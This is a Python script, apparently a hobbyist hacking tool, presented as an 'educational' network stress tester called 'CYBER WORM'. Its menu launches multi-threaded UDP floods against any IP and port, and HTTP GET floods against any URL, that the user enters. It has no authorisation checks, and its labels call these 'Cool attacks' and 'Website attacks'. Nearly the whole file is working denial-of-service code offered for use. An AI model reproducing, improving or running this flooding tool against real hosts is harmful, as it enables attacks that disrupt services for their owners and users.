import socket
import requests
import threading
import os
import sys

# Colors for professional look
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'

def clear_screen():
    os.system('clear')

def print_banner():
    print(f"{GREEN}{BOLD}")
    print("=====================================================")
    print("          CYBER WORM - NETWORK STRESS TESTER           ")
    print("               Educational Tool v1.0                   ")
    print("====================================================={RESET}")

def udp_attack(ip, port, duration, count):
    # Creating a random payload to simulate traffic
    bytes_payload = os.urandom(1024) 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"{RED}[!] Launching UDP Flood on {ip}:{port}...{RESET}")
    for i in range(count):
        try:
            sock.sendto(bytes_payload, (ip, port))
        except Exception as e:
            print(f"Error: {e}")
            break

def http_attack(url, duration, count):
    print(f"{RED}[!] Launching HTTP Flood on {url}...{RESET}")
    for i in range(count):
        try:
            requests.get(url)
        except Exception as e:
            print(f"Error: {e}")
            break

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print(f"\n{BOLD}Please select an option:{RESET}")
        print(f"{GREEN}1{RESET} - Cool attacks (UDP Flood)")
        print(f"{GREEN}2{RESET} - Website attacks (HTTP Flood)")
        print(f"{GREEN}3{RESET} - Exit")
        
        choice = input(f"\n{BOLD}CyberWorm@Kali:~# {RESET}")

        if choice == '1':
            target_ip = input("Enter Target IP Address: ")
            target_port = int(input("Enter Target Port: "))
            attack_count = int(input("Enter Number of Packets: "))
            # Duration is handled by the loop count in this basic version
            
            threads = []
            for _ in range(10): # Multi-threading for speed
                t = threading.Thread(target=udp_attack, args=(target_ip, target_port, 0, attack_count // 10))
                threads.append(t)
                t.start()
            
            for t in threads:
                t.join()
            print(f"\n{GREEN}[+] Attack Completed.{RESET}")
            input("Press Enter to return to menu...")

        elif choice == '2':
            target_url = input("Enter Website URL (e.g., http://example.com): ")
            attack_count = int(input("Enter Number of Requests: "))
            
            threads = []
            for _ in range(10):
                t = threading.Thread(target=http_attack, args=(target_url, 0, attack_count // 10))
                threads.append(t)
                t.start()
            
            for t in threads:
                t.join()
            print(f"\n{GREEN}[+] Attack Completed.{RESET}")
            input("Press Enter to return to menu...")

        elif choice == '3':
            print(f"{GREEN}Exiting... Stay safe, Operator.{RESET}")
            sys.exit()
        else:
            print(f"{RED}Invalid option. Please try again.{RESET}")

if __name__ == "__main__":
    main_menu()
